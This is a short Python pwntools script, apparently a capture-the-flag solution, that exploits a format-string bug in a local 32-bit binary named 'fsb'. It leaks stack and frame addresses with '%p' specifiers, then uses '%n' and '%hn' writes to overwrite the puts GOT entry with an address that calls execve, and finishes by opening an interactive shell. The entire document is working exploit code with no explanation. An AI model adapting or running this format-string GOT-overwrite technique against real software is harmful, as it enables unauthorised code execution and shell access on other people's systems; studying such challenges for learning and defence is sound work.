from pwn import *

def DEBUG():
	gdb.attach(r, '''
					b *0x08048610
					c
				  ''')

context.arch='i386'
elf = ELF('./fsb')

r = process('./fsb')
#DEBUG()

# leak esp and main_ebp 
r.recvuntil('(1)\n')
payload = '%{}$p%{}$p'.format(0x38//4, 0x48//4)
r.sendline(payload)
(esp_p_x38, main_ebp) = [int(i,16) for i in r.recvline().strip().split('0x')[1:]]
esp = esp_p_x38 - 0x50

log.success('esp = ' + hex(esp))
log.success('main_ebp = ' + hex(main_ebp))

# write puts_got into main
puts_got = elf.symbols['got.puts']
r.recvuntil('(2)\n')
payload = '%{}c%{}$n'.format(puts_got, 0x48//4)
r.sendline(payload)

# write execve into puts_got
target = 0x080486ab
r.recvuntil('(3)\n')
payload = '%{}c%{}$hn'.format(target&0xffff, (main_ebp-esp)//4)
r.sendline(payload)

# time to get shell
r.recvuntil('(4)\n')
r.sendline('a'*100)

r.interactive()